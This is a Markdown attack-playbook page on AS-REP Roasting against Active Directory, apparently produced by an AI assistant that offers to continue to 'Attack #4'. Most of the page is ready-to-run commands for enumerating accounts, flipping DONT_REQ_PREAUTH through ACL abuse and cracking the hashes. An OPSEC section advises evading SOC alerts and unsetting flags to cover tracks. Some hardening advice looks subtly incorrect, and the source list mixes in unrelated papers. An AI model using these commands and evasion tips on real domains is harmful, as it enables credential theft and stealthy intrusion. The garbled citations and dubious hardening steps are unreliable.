---
title: "Attack #3 — AS-REP Roasting"
description: "AS-REP Roasting targets Active Directory accounts that have the \"Do not require Kerberos preauthentication\" flag set (DONT_REQ_PREAUTH). Under normal…"
category: active-directory
subcategory: "Credential Access"
tags: ["active-directory", "kerberos", "hashing"]
tools: ["NetExec", "Impacket", "Mimikatz", "Rubeus", "BloodHound"]
difficulty: advanced
updated: "2026-08-10"
source: "vault:ActiveDirectory/AD-Attack/Category-One/🔴 Attack #3 — AS-REP Roasting.md"
---
# 🔴 Attack #3 — AS-REP Roasting

***

## 📖 How It Works

AS-REP Roasting targets Active Directory accounts that have the **"Do not require Kerberos preauthentication"** flag set (`DONT_REQ_PREAUTH`). Under normal Kerberos operation, a user must prove knowledge of their password by encrypting a timestamp and sending it in an AS-REQ — the KDC verifies this before issuing a TGT. When pre-authentication is disabled, however, the KDC skips that verification entirely and **immediately returns an AS-REP containing a blob encrypted with the user's password hash** — with zero proof of identity from the requester.

The attacker simply sends an unauthenticated AS-REQ for the target username, receives the AS-REP, rips out the encrypted section (`$krb5asrep$23$...`), and cracks it offline. The critical distinction from Kerberoasting is that **no valid credentials are required at all** to request the hash — making this a viable first-foothold attack rather than just a post-compromise technique.

> ⚠️ **Windows Server 2022+ Behaviour:** Server 2022 and newer domains enforce stricter Kerberos policies by default. DONT_REQ_PREAUTH on user accounts is now rare in well-maintained domains, but service accounts still frequently have pre-auth disabled. Also, if AES-256 encryption is enforced (not RC4), the hash difficulty increases significantly — but most environments still default to RC4 for compatibility. GetNPUsers.py will request both etype 23 (RC4) and etype 18 (AES-256); always prioritize cracking the RC4 hash if available.

**Chains with:** Attack #1 (user enumeration with Kerbrute feeds usernames directly into AS-REP), Attack #6 (ACL abuse to set DONT_REQ_PREAUTH on target accounts)

### The Full Attack Flow

```
1. Enumerate domain for accounts with DONT_REQ_PREAUTH flag set
   (via LDAP query — attribute: userAccountControl bit 0x400000)
2. Send unauthenticated AS-REQ to the KDC (port 88) for each vulnerable account
3. KDC responds with AS-REP — no credential verification performed
4. Extract encrypted blob from AS-REP ($krb5asrep$23$...)
5. Crack offline with Hashcat (mode 18200) or John the Ripper
6. Recover plaintext password → authenticate as target account
```

### Kerberoasting vs AS-REP Roasting — Key Differences

| Property | Kerberoasting | AS-REP Roasting |
|---|---|---|
| **Credentials needed** | Any valid domain user | **None required** (can be unauthenticated) |
| **What you request** | TGS ticket (service ticket) | AS-REP (TGT response) |
| **Target accounts** | Accounts with SPNs set | Accounts with pre-auth disabled |
| **Hash format** | `$krb5tgs$23$...` | `$krb5asrep$23$...` |
| **Hashcat mode** | 13100 (RC4) | **18200** |
| **Prevalence** | Very common | Less common but devastating |

***

## ⚙️ Prerequisites

| Requirement | Detail |
|---|---|
| **Network access to DC** | Port 88 (Kerberos) reachable — that's it for the unauthenticated variant |
| **Valid domain user (optional)** | Only needed for LDAP enumeration of vulnerable accounts |
| **Target accounts** | Accounts with `DONT_REQ_PREAUTH` flag set in `userAccountControl` |
| **Offline cracking rig** | GPU-accelerated Hashcat preferred; hash is RC4 by default (fast to crack) |

***

## 🛠️ Tools

| Tool | Platform | Notes |
|---|---|---|
| **Impacket — GetNPUsers.py** | Linux | Primary Linux tool; supports unauthenticated + authenticated modes |
| **Rubeus** | Windows | Best Windows tool; auto-discovers and roasts all vulnerable accounts |
| **Kerbrute** | Linux | Can perform AS-REP roasting during user enumeration pass |
| **PowerView — Get-DomainUser** | Windows | Enumerate `DONT_REQ_PREAUTH` accounts via LDAP |
| **BloodHound** | Both | Flags AS-REP roastable accounts; shows attack path |
| **NetExec / CrackMapExec** | Linux | LDAP module can enumerate and dump AS-REP hashes |
| **Hashcat** | Linux/Windows | Mode `18200` for AS-REP hashes |
| **John the Ripper** | Linux | `krb5asrep` format; CPU-based alternative |
| **bloodyAD** | Linux | LDAP framework; can set DONT_REQ_PREAUTH on accounts you control |

***

## 💻 Full Commands

### 🔵 Step 0 — Enumerate Accounts with Pre-Auth Disabled

```bash
# Linux — LDAP query (unauthenticated or authenticated)
ldapsearch -x -H ldap://10.10.10.10 -D "corp\low_user" -w 'Password1' \
  -b "DC=corp,DC=local" \
  "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" \
  sAMAccountName
```

```powershell
# Windows — PowerShell with AD module
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth | \
  Select-Object SamAccountName, DistinguishedName

# Windows — PowerView
Import-Module .\PowerView.ps1
Get-DomainUser -PreauthNotRequired | Select-Object SamAccountName, Description, MemberOf

# Windows — LDAP query with ADSearch
ADSearch.exe --search "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" \
  --attributes cn,distinguishedname,samaccountname
```

***

### 🔴 Impacket — GetNPUsers.py (Linux — Primary Tool)

```bash
# Unauthenticated — brute-force userlist (no creds needed, just usernames)
GetNPUsers.py corp.local/ -no-pass -usersfile valid_users.txt -dc-ip 10.10.10.10

# Unauthenticated — single target account
GetNPUsers.py corp.local/svc_backup -no-pass -dc-ip 10.10.10.10

# Authenticated — auto-enumerate ALL vulnerable accounts from domain (best method)
GetNPUsers.py corp.local/low_user:'Password1' -dc-ip 10.10.10.10 -request

# Authenticated — dump all hashes to file
GetNPUsers.py corp.local/low_user:'Password1' -dc-ip 10.10.10.10 -request \
  -outputfile asrep_hashes.txt -format hashcat

# Authenticated — John format output
GetNPUsers.py corp.local/low_user:'Password1' -dc-ip 10.10.10.10 -request \
  -outputfile asrep_hashes.txt -format john

# Using NTLM hash (no plaintext password needed)
GetNPUsers.py corp.local/low_user -hashes :a87f3a337d73085c45f9416be5787d86 \
  -dc-ip 10.10.10.10 -request
```

> **Hash format you'll see:** `$krb5asrep$23$victim@corp.local:1a2b3c4d...` → `23` = RC4 encryption — fast to crack with Hashcat mode 18200.

***

### 🔴 Rubeus — Windows (Most Powerful)

```powershell
# Roast ALL accounts with pre-auth disabled (auto-discovery)
.\Rubeus.exe asreproast

# Output in Hashcat format to file
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast

# Target a single specific user
.\Rubeus.exe asreproast /user:svc_backup /format:hashcat /outfile:svc_backup.hash

# No-wrap output (prevents base64 line-break corruption)
.\Rubeus.exe asreproast /format:hashcat /nowrap

# From an existing TGT (avoids new auth event)
.\Rubeus.exe asreproast /ticket:<base64_TGT> /format:hashcat

# Enumerate only — list vulnerable accounts without requesting hashes
.\Rubeus.exe asreproast /stats
```

***

### 🔴 Kerbrute — Linux (Unauthenticated, Combining Enum + Roast)

```bash
# Standard user enumeration (will flag pre-auth disabled accounts automatically)
kerbrute userenum -d corp.local --dc 10.10.10.10 /usr/share/wordlists/users.txt

# Note: Kerbrute flags accounts responding without pre-auth during enumeration
# Use GetNPUsers.py to request the actual hashes from those accounts
```

***

### 🔴 NetExec — Linux (Quick Authenticated Sweep)

```bash
# Enumerate and dump AS-REP hashes via LDAP
nxc ldap 10.10.10.10 -u low_user -p 'Password1' --asreproast asrep_hashes.txt

# Using Kerberos ticket (ccache)
export KRB5CCNAME=/tmp/low_user.ccache
nxc ldap 10.10.10.10 --use-kcache --asreproast asrep_hashes.txt
```

***

### 🔴 PowerView — Manual Enumeration + Roasting (Windows)

```powershell
Import-Module .\PowerView.ps1

# Enumerate all DONT_REQ_PREAUTH accounts
Get-DomainUser -PreauthNotRequired -Properties SamAccountName, Description, MemberOf

# Check if a specific user has pre-auth disabled
Get-DomainUser -Identity svc_backup -Properties DoesNotRequirePreAuth

# Enable DONT_REQ_PREAUTH on an account you control (if you have GenericWrite)
# This lets you roast accounts you've targeted via ACL abuse
Set-DomainObject -Identity target_user -XOR @{userAccountControl=4194304} -Verbose
```

> ⚠️ **Advanced Technique:** If you have `GenericWrite` over a user account (from ACL abuse), you can **set** `DONT_REQ_PREAUTH` on that account yourself, making it AS-REP roastable on demand, then crack the hash. This bridges ACL abuse (Category 3) directly into credential theft.

***

### 🔴 bloodyAD — Set DONT_REQ_PREAUTH via LDAP (Linux)

```bash
# Set DONT_REQ_PREAUTH on a user you have write access to
bloodyAD --host 10.10.10.10 -u 'corp.local\low_user' -p 'Password1' \
  set object target_user userAccountControl 4194304

# Unset DONT_REQ_PREAUTH to cover tracks (change 4194304 back to 512)
bloodyAD --host 10.10.10.10 -u 'corp.local\low_user' -p 'Password1' \
  set object target_user userAccountControl 512

# Note: userAccountControl values — 512 = normal user, +4194304 = DONT_REQ_PREAUTH
```

***

### 🔴 ldapmodify — LDAP Modify (Linux Alternative)

```bash
# Create LDIF file to set DONT_REQ_PREAUTH
cat > modify.ldif << 'EOF'
dn: CN=target_user,CN=Users,DC=corp,DC=local
changetype: modify
replace: userAccountControl
userAccountControl: 4194304
EOF

# Apply the modification (requires LDAP write access)
ldapmodify -x -D "CN=low_user,CN=Users,DC=corp,DC=local" -w 'Password1' \
  -H ldap://10.10.10.10 -f modify.ldif
```

***

### 🔴 Offline Cracking — Hashcat

```bash
# AS-REP hash cracking — mode 18200 (RC4-HMAC / krb5asrep)
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt

# With best64 rules (strong coverage for corporate passwords)
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule

# With d3ad0ne rules (aggressive, higher coverage)
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/d3ad0ne.rule

# Combination attack — wordlist + mask (corporate format: Word+Year+Symbol)
hashcat -m 18200 asrep_hashes.txt -a 6 /usr/share/wordlists/rockyou.txt '?d?d?d?s'

# Brute-force mask for short passwords (8 chars, mixed case + digit + symbol)
hashcat -m 18200 asrep_hashes.txt -a 3 ?u?l?l?l?l?d?d?s

# John the Ripper alternative
john --format=krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt asrep_hashes.txt
john --format=krb5asrep asrep_hashes.txt --show
```

***

## 🧩 Troubleshooting

| Error | Cause | Fix |
|---|---|---|
| **`KDC_ERR_PREAUTH_REQUIRED`** | Target account actually requires pre-auth (flag check failed). | Re-verify the account's `userAccountControl` value — may have been set to require pre-auth since enumeration. Try a different account from your list. |
| **`KDC_ERR_CLIENT_NAME_MISMATCH`** | Username doesn't exist in domain or typo in domain name. | Verify username spelling. Check domain FQDN matches domain controller. Run Kerbrute to confirm user exists. |
| **`Socket timeout / No response from KDC`** | Port 88 filtered or KDC unreachable. | Verify network connectivity to DC on port 88 (`nc -zv 10.10.10.10 88`). Check firewall rules. Confirm DC IP is correct. |
| **Hash cracking fails (no plaintext found)** | Password not in wordlist or incorrect ruleset. | Try larger wordlists (SecLists, CrunchBase). Add context-specific rules (company name, keywords). Use mask attacks with common patterns (?d?d?d, ?s?s). |
| **`Traceback: imaplib module not found`** or similar Python errors | Missing dependencies in Impacket installation. | Reinstall Impacket: `pip install impacket --upgrade`. Ensure you're using Python 3.9+ (`python3 --version`). |
| **NTLM hash cracking starts but is very slow** | Wordlist is too large or no GPU acceleration. | Use Hashcat with GPU: `hashcat -m 18200 -d 1` (device 1 = GPU). Reduce wordlist size or use rules instead of full wordlist. |
| **`Rubeus reports "0 accounts to roast"`** | No accounts found with DONT_REQ_PREAUTH in domain. | The domain may enforce pre-auth strictly. Check service accounts specifically — they are more likely to be misconfigured. Verify your user has domain recon permissions. |
| **`GetNPUsers.py returns blank hashes (empty encryption data)`** | Account exists but has no password set (disabled account or computer account). | Filter out disabled accounts and computer accounts from enumeration (`objectClass=user` and NOT `(objectClass=computer)`). Focus on active user accounts only. |

***

## 🎯 OPSEC Tips

### OpSec Ranking (Stealthiest to Loudest)

1. **Unauthenticated AS-REP per-username** (stealthiest) — single 4768 event per user, easily lost in noise
2. **GetNPUsers.py authenticated (with valid account)** — blends with normal LDAP traffic
3. **Rubeus on domain-joined machine** — local execution, minimal network footprint if run in memory
4. **PowerView enumeration from workstation** — moderate LDAP activity, risk if SOC monitors bulk LDAP queries
5. **NetExec subnet spray** (loudest) — multiple 4768 events across many hosts in quick succession, clear detection pattern

### Modern Defence Impact

- **Kerberos Armoring (FAST)** — when enabled, forces pre-auth even on DONT_REQ_PREAUTH accounts. Modern domains with Kerberos hardening render this attack impossible.
- **Event 4768 alerting** — if SOC alerts on `PreAuthType: 0`, each target is immediately detected. Use light enumeration; avoid spraying 20+ accounts in one session.
- **Sysmon + SIEM** — credential dumping (Mimikatz) on the same box where you enumerate is risky. Separate enumeration from cracking phases geographically.

### Opsec Best Practices

- **No credentials = less footprint** — the unauthenticated variant leaves only a Kerberos AS-REQ event, not an LDAP bind
- **Use `/nowrap` in Rubeus** — avoids hash corruption from line wrapping in terminal logs
- **Target high-value accounts first** — look for admin, svc_, backup, or service in the username
- **AS-REP roast BEFORE password spraying** — it's entirely passive and leaves minimal artefacts
- **Combine with GenericWrite abuse** — if you have write access to a user object, set `DONT_REQ_PREAUTH` temporarily, roast it, then unset the flag to cover tracks
- **Avoid mass enumeration over LDAP** — the unauthenticated AS-REQ method per-username is stealthier than a bulk LDAP query listing all pre-auth disabled accounts

***

## 🛡️ Detection — Event IDs

| Event ID | Source | What to Look For |
|---|---|---|
| **4768** | Security Log | AS-REQ sent — **`PreAuthType = 0`** (no pre-auth) is the smoking gun |
| **4768** | Security Log | Multiple 4768 events from a **single IP** for **different usernames** in a short window |
| **4625** | Security Log | Failed logon shortly after — attacker testing cracked credentials |
| **4723 / 4724** | Security Log | Password change on roasted account — attacker using recovered credentials |
| **LDAP query logs** | DC Diagnostic | Bulk query for `userAccountControl` with bit `4194304` set |

**Primary detection signature:** Event 4768 with `PreAuthType: 0` is the clearest indicator. In a well-configured domain, this should essentially never appear during normal operations. A single occurrence warrants investigation; multiple in quick succession from one source IP is near-certain AS-REP Roasting in progress.

### Additional Sysmon Event IDs

| Event ID | Detection |
|---|---|
| **Sysmon 3** | Network connection to port 88 (Kerberos) from unusual process (GetNPUsers, Rubeus wrapper) |
| **Sysmon 22** | DNS query for `_kerberos._tcp.dc._msdcs.corp.local` — DC discovery before roasting |

### Sigma Rule References

- **Sigma rule:** `detection_asreproast_multiple_users` — flags multiple AS-REQ without pre-auth from same source IP
- **Sigma rule:** `dns_kerberos_discovery` — detects SRV record queries for Kerberos before enumeration
- Link: https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_asreproast.yml

### EDR Detections

- **Microsoft Defender for Identity:** AS-REP Roasting detection (suspicious Kerberos activity) — alerts when GetNPUsers or Rubeus detected
- **CrowdStrike Falcon:** Detects Rubeus execution via behavioral analysis (keyword matching in command line)
- **Elastic Security:** Hunt rule `credential_access_asreproast_kerberos` — monitors for unauthenticated Kerberos requests
- **Sysmon + SIEM correlations:** LSASS access + Kerberos port 88 activity in sequence = credential theft chain

### Hardening Commands

```powershell
# Enable Kerberos Armoring (FAST) — forces pre-auth even when disabled
# (Domain-wide GPO setting, Server 2012 R2+ required)
Set-GPRegistryValue -Name "Default Domain Policy" \
  -Key "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Kerberos\Parameters" \
  -ValueName "ForceStartupDCQuery" -Type DWord -Value 1

# Disable DONT_REQ_PREAUTH on all user accounts (remediation)
# Find all accounts with pre-auth disabled:
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} | ForEach-Object {
  Set-ADUser -Identity $_ -DoesNotRequirePreAuth $false
}

# Enable pre-auth requirement via Group Policy
# (GPO path: Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > Security Options)
# Setting: "Network security: Force Kerberos Pre-Authentication" = Enabled

# Monitor for suspicious LDAP queries on DC (Event Log)
Get-WinEvent -FilterHashtable @{
  LogName = 'Directory Service'
  ID = 4662
} -MaxEvents 100 | Where-Object { $_.Properties[6] -match "4194304" }
```

***

## 🗺️ MITRE ATT&CK

| Tactic | Technique ID | Sub-technique | Observed in | Platforms | Data Sources |
|---|---|---|---|---|---|
| Credential Access | T1558 | **004** (AS-REP) | APT1, APT28, APT29, Wizard Spider | Windows | Authentication logs (4768), Process creation (Sysmon 1), Network traffic (Kerberos port 88) |

**T1558.004 — Steal or Forge Kerberos Tickets: AS-REP Roasting** — Specifically targets the AS-REP response from KDC when pre-authentication is disabled. Leads to offline password cracking without needing valid credentials.

***

## 🔗 Attack Chain Context

```
[AS-REP Roasting] ──→ Plaintext Password Recovered (no prior creds needed)
         │
         ├──→ 🔑 First foothold — use recovered creds to authenticate to domain
         ├──→ 🔍 BloodHound enumeration with recovered account
         ├──→ 🎫 Kerberoasting (pivot to SPN accounts from new foothold)
         ├──→ 🔓 Access shares, emails, web apps with service account creds
         ├──→ 📝 GenericWrite → SET DONT_REQ_PREAUTH on other accounts
         └──→ 🎯 If roasted account is in high-priv group → direct escalation path
```

**What makes this dangerous as an initial attack:** Unlike Kerberoasting, AS-REP Roasting requires **zero credentials to pull hashes** — just a username list and network access to port 88. Combined with Kerbrute user enumeration (Attack #1 recon phase), an attacker can go from **zero knowledge → valid domain credentials** with no lockout risk whatsoever, as each account is only queried once.

***

> ✅ **Attack #3 — AS-REP Roasting complete.** Tell me to move on when you're ready for **Attack #4 — Pass-the-Hash (PtH)**.

Sources
 AS-REP Roasting Attack - How It Works and Defense Strategies https://netwrix.com/en/cybersecurity-glossary/cyber-security-attacks/as-rep-roasting/
 AS-REP Roasting Attack Explained - MITRE ATT&CK T1558.004 https://www.picussecurity.com/resource/blog/as-rep-roasting-attack-explained-mitre-attack-t1558.004
 AS-REP Roasting - Penetration Testing Lab https://pentestlab.blog/2024/02/20/as-rep-roasting/
 What is AS-REP Roasting? | Semperis Identity Attack Catalog https://www.semperis.com/blog/as-rep-roasting-explained/
 AD Recon – AS-REP Roasting Attacks - Active Directory Attack https://juggernaut-sec.com/as-rep-roasting/
 The Silent Threat in Active Directory: How AS-REP Roasting Steals ... https://www.trellix.com/blogs/research/the-silent-threat-in-active-directory/
 AS-REP roasting detection https://www.hackthebox.com/blog/as-rep-roasting-detection
 Zipper Stack: Shadow Stacks Without Shadow https://arxiv.org/pdf/1902.00888.pdf
 Oreo: Protecting ASLR Against Microarchitectural Attacks (Extended Version) http://arxiv.org/pdf/2412.07135.pdf
 Security Mitigations for Return-Oriented Programming Attacks https://arxiv.org/pdf/1008.4099.pdf
 Attacking Recommender Systems with Augmented User Profiles https://arxiv.org/pdf/2005.08164.pdf
 Data-Free Hard-Label Robustness Stealing Attack https://arxiv.org/pdf/2312.05924.pdf
 ROPNN: Detection of ROP Payloads Using Deep Neural Networks https://arxiv.org/pdf/1807.11110.pdf
 Adversarial Attacks on Both Face Recognition and Face Anti-spoofing Models https://arxiv.org/html/2405.16940v1
 VANET Routing Replay Attack Detection Research Based on SVM https://www.matec-conferences.org/articles/matecconf/pdf/2016/26/matecconf_mmme2016_05020.pdf
 What is AS-REP Roasting? https://jumpcloud.com/it-index/what-is-as-rep-roasting
 AS-REP Roasting Attack Explained | Real-Life Active Directory Exploit ... https://www.youtube.com/watch?v=zl0v5lYSNlQ
 InternalAllTheThings/docs/active-directory/ad-roasting-asrep.md at main · swisskyrepo/InternalAllTheThings https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/active-directory/ad-roasting-asrep.md
 AS-REP Roasting: Exploiting Kerberos for Password Hashes https://redbotsecurity.com/as-rep-roasting/
 Cracking Active Directory Passwords with AS-REP Roasting https://netwrix.com/en/resources/blog/cracking_ad_password_with_as_rep_roasting/
